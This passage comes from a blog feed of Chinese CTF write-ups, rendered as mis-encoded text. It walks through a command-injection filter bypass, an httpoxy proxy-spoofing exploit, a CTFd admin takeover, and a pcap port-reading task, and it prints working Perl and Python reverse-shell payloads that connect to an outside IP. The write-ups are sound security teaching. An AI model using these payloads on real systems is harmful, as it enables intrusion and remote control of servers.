title="å‘½ä»¤æ³¨å…¥-ç»¼åˆ"></a>å‘½ä»¤æ³¨å…¥-ç»¼åˆ</h2><p>ä¸€ä¸ªè€ƒå¯Ÿç‚¹æ¯”è¾ƒå…¨é¢ï¼Œä½†æ˜¯ä¹Ÿæ˜¯æ¯”è¾ƒå…¥é—¨çš„é¢˜ç›®ã€‚ä¸»è¦è€ƒå¯Ÿäº†å¯¹è¿æ¥ç¬¦ã€ç‰¹æ®Šæ–‡ä»¶åã€è¯»å–æ–‡ä»¶å‘½ä»¤ç­‰è¿‡æ»¤çš„ç»•è¿‡ã€‚<br>è¿™ä¸ªé¢˜è§£é¢˜çš„æ—¶å€™èµ°äº†ä¸€å¤§åœˆå¼¯è·¯ï¼Œå¹¶ä¸”è¿˜æ’åˆ°äº†å¢™ä¸Šï¼Œåæ¥ç”¨æ­£å¸¸å§¿åŠ¿è§£äº†å‡ºæ¥â€¦</p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æ—¢ç„¶æ¯”è¾ƒç»¼åˆï¼Œå…ˆçœ‹çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$res = <span class="keyword">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]) &amp;&amp; $_GET[<span class="string">'ip'</span>]) &#123;</span><br><span class="line">    $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">    $m = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span>, $ip, $m)) &#123;</span><br><span class="line">        $cmd = <span class="string">"ping -c 4 &#123;$ip&#125;"</span>;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¯¹<code>ip</code>ä¼ å‚å†…å®¹ä¸­çš„<code>è¿æ¥ç¬¦</code>ã€<code>ç©ºæ ¼</code>ã€<code>cat</code>å‘½ä»¤ã€<code>flag</code>å­—æ®µè¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯¹ç©ºæ ¼è¿‡æ»¤å¾ˆç®€å•ï¼Œ<code>${IFS}</code>å°±è¡Œï¼Œä¹‹å‰çš„ä¸€ç¯‡åšå®¢ä¹Ÿå†™è¿‡ï¼Œå¯¹<code>cat</code>å’Œ<code>flag</code>çš„è¿‡æ»¤ä¹Ÿå¾ˆç®€å•ï¼Œç”¨<code>\</code>å³å¯ç»•è¿‡ï¼š<code>ca\t f\lag</code>ï¼Œå…³é”®å°±åœ¨äºå¯¹<code>|ã€&amp;ã€;</code>ä¸‰ä¸ªè¿æ¥ç¬¦çš„è¿‡æ»¤ï¼Œæœ€åˆæ²¡æœ‰è€ƒè™‘æ˜¯<code>GET</code>ä¼ å‚ï¼Œå¿˜è®°äº†ç”¨<code>%0a</code>ä»£æ›¿<code>;</code>ï¼Œè€Œæ˜¯é€‰æ‹©ç”¨<code>8/16è¿›åˆ¶</code>è¿›è¡Œç»•è¿‡ï¼Œä»è€Œè·³è¿›äº†å¤§å‘â€¦<br>è¿™ç§æ–¹æ³•æ„é€ æ€è·¯å°±æ˜¯ï¼šåˆ©ç”¨å­—ç¬¦çš„<code>ascii</code>ç å¯¹åº”çš„<code>8/16è¿›åˆ¶</code>è¡¨ç¤ºå­—ç¬¦ï¼Œç»“åˆ<code>printf</code>å‘½ä»¤è¾“å‡ºå­—ç¬¦ä¸²ï¼Œç„¶ååˆ©ç”¨<code>$</code>å°†å­—ç¬¦ä¸²å½“ä½œå‘½ä»¤æ‰§è¡Œï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span>ï¼š$(printf$&#123;IFS&#125;<span class="string">"\154\163"</span>)</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/ctfhub2.png" alt=""><br>ä½†æ˜¯æ„é€ çš„payloadä¸€ç›´æ²¡æ‰“é€šï¼Œäºæ˜¯æœ¬åœ°æµ‹äº†ä¸€ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub3.png" alt=""><br>åŸæ¥æ˜¯è¾“å‡ºçš„å†…å®¹è¢«å½“ä½œipçš„ä¸€éƒ¨åˆ†äº†â€¦ ä½†æ˜¯æ²¡ææ‡‚ä¸ºå•¥è¿™æ ·æ„é€ å‡ºæ¥çš„å­—ç¬¦ä¼šè¢«å½“åšå‰é¢å‘½ä»¤çš„ä¸€éƒ¨åˆ†â€¦</p><h3 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>ç”±äºæ˜¯<code>GET</code>ä¼ å‚ï¼Œåˆ©ç”¨è¿æ¥ç¬¦çš„urlç¼–ç å°±èƒ½ç»•è¿‡ï¼Œæ¯”å¦‚<code>;</code>å¯¹åº”<code>%0a</code>ï¼Œæ„é€ payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip&#x3D;127.0.0.1%0acd$&#123;IFS&#125;fl\ag_is_here%0aca\t$&#123;IFS&#125;fl\ag_64331483515023.php</span><br></pre></td></tr></table></figure><p>å³å¯æ‹¿åˆ°flagï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub4.png" alt=""><br>è¿™é‡Œçš„<code>cat</code>å…¶å®è¿˜å¯ä»¥ç”¨<code>more</code>ã€<code>less</code>ã€<code>tail</code>ã€<code>sort</code>å‘½ä»¤æ›¿æ¢ï¼Œå…·ä½“å¯ä»¥æŸ¥ä¸€ä¸‹å‡ ä¸ªå‘½ä»¤çš„åŒºåˆ«ã€‚<br>å¯¹æ–‡ä»¶åçš„è¿‡æ»¤ä¹Ÿå¯ä»¥é€šè¿‡åˆ©ç”¨å˜é‡çš„å½¢å¼æ¥ç»•è¿‡ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šä¾‹å­å¯ä»¥å‚è€ƒï¼Œè¿™é‡Œä¸å†å†™äº†ã€‚</p><p>å…³äºæ›´å¤šå‘½ä»¤æ³¨å…¥çš„ç»•è¿‡å§¿åŠ¿å¯ä»¥å‚è€ƒ<a href="https://www.dazhuanlan.com/2019/12/18/5df97aff1f94c/">è¿™é‡Œ</a>ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æŠ€èƒ½æ ‘é‡Œå‡ é“å­¦åˆ°æ–°çŸ¥è¯†çš„é¢˜ç›®çš„è®°å½•ï¼Œè¿˜ä¸é”™è¿˜ä¸é”™ğŸ˜
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="webå®‰å…¨" scheme="http://ggb0n.cool/categories/CTF/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTFHubåˆ·é¢˜" scheme="http://ggb0n.cool/categories/CTF/web%E5%AE%89%E5%85%A8/CTFHub%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://ggb0n.cool/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="00æˆªæ–­" scheme="http://ggb0n.cool/tags/00%E6%88%AA%E6%96%AD/"/>
    
      <category term="å‘½ä»¤æ³¨å…¥" scheme="http://ggb0n.cool/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;Nå…¬å¼€èµ›</title>
    <link href="http://ggb0n.cool/2020/02/29/V&amp;N%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
    <id>http://ggb0n.cool/2020/02/29/V&amp;N%E5%85%AC%E5%BC%80%E8%B5%9B/</id>
    <published>2020-02-29T12:33:18.000Z</published>
    <updated>2020-05-13T03:09:39.095Z</updated>
    
    <content type="html"><![CDATA[<p>éš”ç¦»åœ¨å®¶æ— äº‹åšï¼Œæ‰“æ‰“æ¯”èµ›ä¹è¶£å¯»~ å§æ§½ï¼æ¯•è®¾è¿˜æ²¡å¼€å§‹ï¼Ÿï¼ğŸ¤¨<a id="more"></a></p><h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>è€ƒå¯Ÿ<a href="https://yinwc.github.io/2018/11/15/vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#HTTPoxy%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-5385%EF%BC%89">CVE-2016-5385</a>ï¼šå¯ä»¥ç†è§£ä¸ºä¼ªé€ ä»£ç†å§ã€‚</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†<code>Guzzle</code>ï¼š</p><blockquote><p>Guzzleæ˜¯ä¸€ä¸ªä½¿å¾—åˆ©ç”¨PHPå®ç°å‘é€HTTPè¯·æ±‚ï¼Œæ–¹ä¾¿å’Œweb serviceé›†æˆçš„PHPå®¢æˆ·ç«¯æ¨¡æ‹Ÿç»„ä»¶ã€‚ä¸€å¥è¯ï¼Œå®ƒå°±åƒä¸€ä¸ªPHPå†™çš„æµè§ˆå™¨ã€‚å½“ä½ çš„æœåŠ¡ç«¯ç¨‹åºéœ€è¦ä½œä¸ºå®¢æˆ·ç«¯æ¥è®¿é—®å…¶ä»–çš„serviceæœåŠ¡æ—¶ï¼Œè¿™å°±æ˜¯ä½ æ‰€éœ€è¦çš„ã€‚<br>ç®€å•çš„æ¥å£æ„å»ºquery stringï¼ŒPOST requests,streaming large uploads/downloads,ä½¿ç”¨HTTP cookies,ä¸Šä¼ json dataç­‰ã€‚</p></blockquote><p>æ ¹æ®ä»£ç é€»è¾‘ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>flag</code>ä¼ å‚æ¥æ‹¿åˆ°flagï¼Œä½†æ˜¯æ˜¯é€šè¿‡åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ª<code>client()</code>ï¼Œç„¶ååˆ©ç”¨è¿™ä¸ª<code>client</code>å»è®¿é—®æœ¬åœ°5000ç«¯å£ä¸‹çš„<code>/api/eligible</code>æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼Œå°†è¿”å›çš„jsonæ•°æ®è§£ç ä¹‹åï¼Œå¦‚æœå­—æ®µé‡Œçš„<code>success</code>ä¸º<code>true</code>ï¼Œå³å¯æ‹¿åˆ°flagã€‚</p><p>å…³é”®å°±åœ¨äº<code>$client-&gt;get(&#39;http://127.0.0.1:5000/api/eligible&#39;)</code>ï¼Œé¢˜ç›®æœåŠ¡å™¨ä¸Šè‚¯å®šæ˜¯æ²¡æœ‰è¿™ä¸ªäº†ï¼Œæƒ³è¦å®ç°è¦ä¹ˆå¯ä»¥é€šè¿‡æ‹¿åˆ°shellå†™å…¥ï¼Œè¦ä¹ˆå°±æ˜¯ä»£ç†åˆ°VPSä¸Šã€‚<br>é€šè¿‡<code>phpinfo</code>å¯ä»¥çœ‹åˆ°ï¼Œæ¥å£ç”¨çš„æ˜¯<code>fastCGI</code>ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web116.png" alt=""><br>æ‰¾åˆ°çš„<a href="https://yinwc.github.io/2018/11/15/vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#HTTPoxy%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-5385%EF%BC%89">CVE-2016-5385</a>å°±æ˜¯é€šè¿‡CGIæ¥ä¼ªé€ ä»£ç†ï¼Œå¤§è‡´åŸç†ï¼š</p><blockquote><p><code>cgi(fastcgi)</code>è¦å°†ç”¨æˆ·ä¼ å…¥çš„æ‰€æœ‰HTTPå¤´éƒ½åŠ ä¸Š<code>HTTP_</code>å‰ç¼€æ”¾å…¥ç¯å¢ƒå˜é‡ä¸­ï¼Œè€Œæ°å¥½å¤§å¤šæ•°ç±»åº“çº¦å®šä¿—æˆä¼šæå–ç¯å¢ƒå˜é‡ä¸­çš„<code>HTTP_PROXY</code>å€¼ä½œä¸ºHTTPä»£ç†åœ°å€ã€‚äºæ˜¯ï¼Œæ¶æ„ç”¨æˆ·é€šè¿‡æäº¤<code>Proxy: http://evil.com</code>è¿™æ ·çš„HTTPå¤´ï¼Œå°†ä½¿ç”¨ç¼ºé™·ç±»åº“çš„ç½‘ç«™çš„ä»£ç†è®¾ç½®ä¸º<code>http://evil.com</code>ï¼Œè¿›è€Œçªƒå–æ•°æ®åŒ…ä¸­å¯èƒ½å­˜åœ¨çš„æ•æ„Ÿä¿¡æ¯ã€‚</p></blockquote><p>äºæ˜¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç†ä¸€ä¸‹è§£é¢˜æ€è·¯äº†ï¼š</p><ul><li>1ã€åœ¨VPSä¸Šæ„é€ <code>/api/eligible/index.php</code>ï¼Œå¹¶ä¸”è¯»å–åˆ°çš„ç»“æœè¦åŒ…å«<code>{â€œsuccessâ€:true}</code>ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢çš„<code>index.php</code>çš„ä»£ç </li><li>2ã€åˆ©ç”¨<code>php -S localhost:5000</code>åœ¨VPSä¸Šæ‰“å¼€webæœåŠ¡çš„ç«¯å£ï¼Œæ³¨æ„ï¼šåœ¨åŒ…å«<code>/api/eligible/index.php</code>çš„æ–‡ä»¶å¤¹ä¸‹å¼€å¯webæœåŠ¡</li><li>3ã€é€šè¿‡<code>flag</code>ä¼ å‚ï¼ŒæŠ“åŒ…ï¼Œåœ¨è¯·æ±‚å¤´ä¸­åŠ å…¥ï¼š<code>http://ip:port</code>ï¼Œæ­¤å¤„çš„<code>ip</code>æ˜¯VPSçš„ip(ç”±äºBUUè¦æ±‚å†…ç½‘ç¯å¢ƒï¼Œè¿™é‡Œå°±å¡«å†…ç½‘æœºå™¨çš„ip)ï¼Œ<code>port</code>ä¸ºVPSä¸Šä¸€ä¸ªå¼€å¯çš„ç«¯å£ï¼Œå¯ä»¥åˆ©ç”¨<code>php -S</code>å‘½ä»¤å¼€å¯ä¸¤ä¸ªwebæœåŠ¡ç«¯å£æ¥è¿›è¡Œ</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = <span class="keyword">array</span>();</span><br><span class="line">$data[<span class="string">'success'</span>] = <span class="keyword">true</span>;</span><br><span class="line"> </span><br><span class="line">$json_string = json_encode($data);</span><br><span class="line"><span class="keyword">echo</span> $json_string;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”±äºBUUä¸Šéœ€è¦ç”¨å†…ç½‘ï¼Œå°±åœ¨BUUä¸­å¼€äº†ä¸€ä¸ªå†…ç½‘ç¯å¢ƒä½œä¸ºVPSï¼š<br><img src="http://www.ggb0n.cool/images/114.png" alt=""><br><img src="http://www.ggb0n.cool/images/113.png" alt=""><br>å¦‚æ­¤ä»¥æ¥ï¼ŒVPSå°±æˆä¸ºä»£ç†äº†ï¼Œåé¢çš„<code>$client-&gt;get(&#39;http://127.0.0.1:5000/api/eligible&#39;)</code>ä¹Ÿå°±åœ¨VPSä¸Šæ‰§è¡Œäº†ï¼Œä»è€Œæ‰¾åˆ°æŒ‡å®šæ–‡ä»¶ï¼Œè¿”å›<code>{â€œsuccessâ€:true}</code>ï¼Œè¿›è€Œé€šè¿‡åé¢çš„åˆ¤æ–­ï¼Œæ‹¿åˆ°flagã€‚<br><img src="http://www.ggb0n.cool/images/112.png" alt=""></p><h2 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h2><p>è€ƒå¯Ÿåˆ©ç”¨perlæˆ–pythonåå¼¹shellï¼Œé€šè¿‡æ–‡ä»¶æè¿°ç¬¦è¯»å–è¢«åˆ é™¤çš„æ–‡ä»¶å†…å®¹ã€‚</p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>é¢˜ç›®æºç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>) </span><br><span class="line"><span class="comment"># flag = flag_file.read() </span></span><br><span class="line"><span class="comment"># flag_file.close() </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># @app.route('/flag') </span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment"># return flag</span></span><br><span class="line"><span class="comment">#want flag? naive! </span></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think </span></span><br><span class="line"><span class="meta">@app.route('/shell') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span> </span><br><span class="line">os.system(<span class="string">"rm -f flag.txt"</span>) </span><br><span class="line">exec_cmd = request.args.get(<span class="string">'c'</span>) </span><br><span class="line">os.system(exec_cmd) </span><br><span class="line"><span class="keyword">return</span> <span class="string">"1"</span> </span><br><span class="line"><span class="meta">@app.route('/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span> </span><br><span class="line"><span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>: </span><br><span class="line">app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œflagæ–‡ä»¶é¦–å…ˆè¢«è¯»å–äº†ï¼Œè¯»å–æ–‡ä»¶çš„è¿›ç¨‹åœ¨å†…å­˜ä¸­æ˜¯å­˜åœ¨çš„ï¼Œå› æ­¤å½“æˆ‘ä»¬é€šè¿‡<code>/shell?c=</code>æ¥ä¼ å…¥å‘½ä»¤çš„æ—¶å€™ï¼Œè™½ç„¶ä¼šå…ˆåˆ æ‰flagæ–‡ä»¶ï¼Œä½†æ˜¯flagå†…å®¹ä»ç„¶åœ¨å†…å­˜é‡Œï¼Œé€šè¿‡è¯»å–<code>/proc/PID/fd/æ–‡ä»¶æè¿°ç¬¦</code>æ¥è¯»å–ã€‚<br>è§£é¢˜çš„å…³é”®å°±æ˜¯é€šè¿‡å‚æ•°<code>c</code>åˆ©ç”¨<code>system</code>æ‰§è¡Œå‘½ä»¤æ¥åå¼¹shellï¼Œç„¶åå»è¿›ç¨‹ä¿¡æ¯ä¸­æ‰¾flagã€‚</p><p>åœ¨è¿™é‡Œ<code>curl</code>ä¸èƒ½ç”¨äº†ï¼Œä½†æ˜¯è¿˜å¯ä»¥åˆ©ç”¨<code>perl</code>ã€<code>python</code>ã€<code>ruby</code>ç­‰è¯­è¨€æ¥åå¼¹shellï¼Œpyloadå¦‚ä¸‹ï¼š</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">/shell?c=perl%20-MIO%20-e%20%27$p=<span class="keyword">fork</span>;<span class="keyword">exit</span>,<span class="keyword">if</span>($p);$c=new%20IO::Socket::INET(PeerAddr,%22174.<span class="number">0</span>.<span class="number">216.133</span>:<span class="number">2017</span>%22);STDIN-%3Efdopen($c,r);$~-%3Efdopen($c,w);<span class="keyword">system</span>$_%20while%3C%3E;%27</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="code"><pre><span class="line">/shell?c=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.0.216.133%22,2017));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure><p>æ³¨æ„æ˜¯åå¼¹shellåˆ°VPSä¸Šï¼Œä½†æ˜¯BUUéœ€è¦ç”¨å†…ç½‘ç¯å¢ƒï¼Œå’Œä¸Šé¢˜ä¸€æ ·ï¼Œå¼€ä¸€ä¸ªBUUçš„å†…ç½‘ç¯å¢ƒï¼Œé€šè¿‡<code>nc -l -p 2017</code>ç›‘å¬ç«¯å£:<br><img src="http://www.ggb0n.cool/images/107.png" alt=""><br>ç„¶ååˆ©ç”¨ä¸Šé¢çš„payloadè®¿é—®å³å¯åå¼¹shell<br>åˆ©ç”¨<code>perl</code>åå¼¹çš„shellå¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/108.png" alt=""><br><img src="http://www.ggb0n.cool/images/109.png" alt=""><br>åˆ©ç”¨<code>python</code>åå¼¹çš„shellï¼š<br><img src="http://www.ggb0n.cool/images/110.png" alt=""><br>å…¶å®è¿˜æ˜¯pythonåå¼¹çš„å¥½ç”¨äº›ã€‚</p><p>é€šè¿‡<code>cat /proc/PID/fd/æ–‡ä»¶æè¿°ç¬¦</code>ä¸€ä¸ªä¸ªåœ°æ‰¾å°±èƒ½æ‹¿åˆ°flagäº†ã€‚</p><h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>è€ƒå¯Ÿåˆšçˆ†å‡ºçš„CTFdå­˜åœ¨çš„ä¸€ä¸ªCVEï¼Œ<a href="https://www.colabug.com/2020/0204/6940556/amp/">CVE-2020-7245</a></p><h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>ä¸Šé¢çš„CVEé“¾æ¥ä¸­è®²çš„å·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œæ•´ä½“çš„è§£é¢˜æ€è·¯å°±æ˜¯ï¼š</p><ul><li>1ã€æ³¨å†Œä¸€ä¸ª<code>admin</code>ç”¨æˆ·ï¼Œ(æ³¨æ„å‰é¢çš„ç©ºæ ¼)</li><li>2ã€æ›´æ”¹ä¸Šé¢ç”¨æˆ·çš„å¯†ç ï¼Œå³åˆ©ç”¨æ³¨å†Œçš„é‚®ç®±æ¥æ›´æ”¹å¯†ç </li><li>3ã€æˆåŠŸä¿®æ”¹ç®¡ç†å‘˜çš„å¯†ç å¹¶ç™»å½•</li></ul><p>æ³¨æ„BUUçš„å†…ç½‘ç¯å¢ƒéœ€è¦ç”¨å†…ç½‘é‡Œçš„é‚®ç®±ï¼Œå¦åˆ™æ”¶ä¸åˆ°é‚®ä»¶ï¼Œå·¨å‘â€¦</p><p>ç™»å½•ä¹‹åï¼Œåœ¨ç®¡ç†é€šé“å‘ç°<code>flagåœ¨å“ªé‡Œ</code>ä¸€ä¸ªé¢˜ç›®ï¼ŒæŠŠå®ƒçš„éšè—å±æ€§æ”¹ä¸ºå¯è§çš„ï¼Œå†åˆ°challengeé¡µé¢å³å¯çœ‹åˆ°è¯¥é¢˜ç›®ï¼Œä¸‹è½½é™„ä»¶å³å¯æ‹¿åˆ°flagã€‚</p><h2 id="æ‹‰èƒ¯çš„ä¸‰æ¡å‘½ä»¤"><a href="#æ‹‰èƒ¯çš„ä¸‰æ¡å‘½ä»¤" class="headerlink" title="æ‹‰èƒ¯çš„ä¸‰æ¡å‘½ä»¤"></a>æ‹‰èƒ¯çš„ä¸‰æ¡å‘½ä»¤</h2><p>æƒ³åˆ°äº†çƒ­å‰§â€œäº²çˆ±çš„ï¼Œçƒ­çˆ±çš„â€â€¦</p><h3 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>ä¸‹è½½é™„ä»¶ä¹‹åï¼Œå°†åç¼€æ”¹ä¸º<code>.zip</code>è§£å‹å‘ç°ä¸€ä¸ªæ•°æ®åŒ…å’Œä¸€ä¸ªæç¤ºçš„txtæ–‡ä»¶ï¼Œæç¤ºå°†æ•°æ®åŒ…ä¸­çš„ç«¯å£ä»å°åˆ°å¤§æ’åˆ—å³ä¸ºflagã€‚<br>åˆ©ç”¨<code>tcpdump</code>ç›´æ¥è¯»æ•°æ®åŒ…ä¸­çš„ç«¯å£ï¼Œç„¶åå°±èƒ½æ‹¿åˆ°flagï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tcpdump</span> -n -r nmapll.pcapng <span class="string">'tcp[13]=18'</span> | awk <span class="string">'&#123;print <span class="variable">$3</span>&#125;'</span> | sort -u</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/111.png" alt=""><br>ç»„åˆå³ä¸ºflagã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;éš”ç¦»åœ¨å®¶æ— äº‹åšï¼Œæ‰“æ‰“æ¯”èµ›ä¹è¶£å¯»~ å§æ§½ï¼æ¯•è®¾è¿˜æ²¡å¼€å§‹ï¼Ÿï¼ğŸ¤¨
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="æ¯”èµ›åˆ’æ°´" scheme="http://ggb0n.cool/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="CVE" scheme="http://ggb0n.cool/tags/CVE/"/>
    
      <category term="CVE-2016-5385ä»£ç†ä¼ªé€ " scheme="http://ggb0n.cool/tags/CVE-2016-5385%E4%BB%A3%E7%90%86%E4%BC%AA%E9%80%A0/"/>
    
      <category term="CVE-2020-7245" scheme="http://ggb0n.cool/tags/CVE-2020-7245/"/>
    
      <category term="tcpdumpè·å–æ•°æ®åŒ…ç«¯å£" scheme="http://ggb0n.cool/tags/tcpdump%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85%E7%AB%AF%E5%8F%A3/"/>
    
      <category term="webshell" scheme="http://ggb0n.cool/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>å®‰æ’-æŠ—ç–«æœˆèµ›</title>
    <link href="http://ggb0n.cool/2020/02/26/%E5%AE%89%E6%81%92-%E6%8A%97%E7%96%AB%E6%9C%88%E8%B5%9B/"/>
    <id>http://ggb0n.cool/2020/02/26/%E5%AE%89%E6%81%92-%E6%8A%97%E7%96%AB%E6%9C%88%E8%B5%9B/</id>
    <published>2020-02-26T12:38:28.000Z</published>
    <updated>2020-05-13T03:09:57.931Z</updated>
    
